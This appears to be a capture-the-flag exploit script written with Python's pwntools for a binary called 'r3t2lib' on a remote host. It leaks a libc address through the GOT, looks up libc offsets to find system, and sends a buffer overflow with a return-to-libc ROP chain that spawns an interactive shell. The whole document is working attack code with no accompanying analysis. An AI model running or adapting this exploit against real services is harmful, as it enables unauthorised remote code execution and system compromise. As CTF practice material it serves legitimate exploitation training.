from pwn import *
from LibcSearcher import LibcSearcher
#r = process('./r3t2lib')
r = remote('140.110.112.31', 2123)
elf = ELF('./r3t2lib')
pop_rdi_ret = 0x400843
context.arch='amd64'
libc_start_main_got = elf.got['__libc_start_main']
r.recvline()
r.recvline()
print r.recvline()
print r.recvuntil(':')
print hex(libc_start_main_got)
r.send(hex(libc_start_main_got))
main_addr = int(r.recvline().split()[6], 16)
print 'leak_main:', hex(main_addr)
libc = LibcSearcher('__libc_start_main', main_addr)
libcbase = main_addr - libc.dump('__libc_start_main')
system_addr = libcbase + libc.dump('system')
ret = 0x00400539
binsh_addr = 0x4003c4

print 'leak_system:', hex(system_addr)
print 'leak_shell:', hex(binsh_addr)
print r.recvuntil('me :')

payload = flat(['a' * 280, ret, pop_rdi_ret, binsh_addr, system_addr])
# cuz ubuntu 18.04 layout problem, so affter offset we need to add ret to remain layout
r.sendline(payload)
r.interactive()
